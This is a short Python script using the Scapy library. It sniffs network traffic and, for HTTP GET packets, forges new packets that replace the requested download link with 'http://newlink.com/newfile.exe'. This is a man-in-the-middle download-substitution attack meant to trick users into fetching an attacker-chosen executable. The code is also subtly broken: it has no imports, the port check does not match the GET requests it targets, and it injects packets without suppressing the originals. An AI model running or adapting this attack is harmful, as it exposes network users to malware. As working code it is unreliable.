#!/usr/bin/env python
def packet_callback(packet):
    # Check if the packet is a HTTP GET request
    if packet[TCP].sport == 80 and packet.haslayer(Raw) and b'GET' in packet[Raw].load:
        # Get the original download link
        download_link = packet[Raw].load.split(b'\r\n')[0].split()[1]
        # Replace the download link with the new one
        new_packet = IP(dst=packet[IP].dst,src=packet[IP].src)/\
                     TCP(dport=packet[TCP].dport, sport=packet[TCP].sport,seq=packet[TCP].seq,ack=packet[TCP].ack,flags="PA")/\
                     Raw(load=packet[Raw].load.replace(download_link, b'http://newlink.com/newfile.exe'))
        # Send the modified packet
        send(new_packet)

sniff(prn=packet_callback)